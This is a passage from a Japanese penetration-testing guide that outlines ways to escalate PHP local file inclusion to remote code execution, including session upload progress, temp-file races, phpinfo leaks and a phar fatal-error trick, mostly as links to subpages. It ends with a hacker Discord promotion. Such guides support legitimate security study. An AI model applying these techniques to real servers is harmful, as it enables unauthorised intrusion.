[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### PHP\_SESSION\_UPLOAD\_PROGRESSを介して

セッションがなく、`session.auto_start`が`Off`でも**ローカルファイルインクルージョン**を見つけた場合、**`PHP_SESSION_UPLOAD_PROGRESS`**を**マルチパートPOST**データで提供すると、PHPが**セッションを有効に**します。これを悪用してRCEを取得できます：

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Windowsでの一時ファイルアップロードを介して

**ローカルファイルインクルージョン**を見つけ、サーバーが**Windows**で実行されている場合、RCEを取得できるかもしれません：

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### phpinfo()（file\_uploads = on）を介して

**ローカルファイルインクルージョン**を見つけ、file\_uploads = onのphpinfo()を公開するファイルがある場合、RCEを取得できます：

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + パス開示を介して

**ローカルファイルインクルージョン**を見つけ、一時ファイルのパスを**外部に漏洩**できるが、**サーバー**が**インクルードするファイルにPHPマークがあるかどうかをチェック**している場合、この**競合状態**を使用してそのチェックを**バイパス**できます：

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### 永遠の待機 + ブルートフォースを介して

LFIを悪用して**一時ファイルをアップロード**し、サーバーが**PHP実行を停止**させることができれば、その後**数時間かけてファイル名をブルートフォース**して一時ファイルを見つけることができます：

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### 致命的エラーへ

`/usr/bin/phar`、`/usr/bin/phar7`、`/usr/bin/phar.phar7`、`/usr/bin/phar.phar`のいずれかのファイルをインクルードします（同じものを2回インクルードする必要があります）。

**これがどのように有用かはわかりませんが、有用かもしれません。**\
_PHP致命的エラーを引き起こしても、アップロードされたPHP一時ファイルは削除されます。_

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## 参考文献

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)サーバーに参加して、経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取りましょう！

**ハッキングの洞察**\
ハッキングのスリルとチャレンジに深く入り込むコンテンツに参加しましょう

**リアルタイムハックニュース**\
リアルタイムのニュースと情報を通じて、ハッキングの世界を最新の状態に保ちましょう

**最新のアナウンス**\
最新のバグバウンティの開始や重要なプラットフォームの更新情報を把握しましょう

**[**Discord**](https://discord.com/invite/N3FrSbmwdy)**に参加して、今日からトップハッカーと協力を始めましょう！**
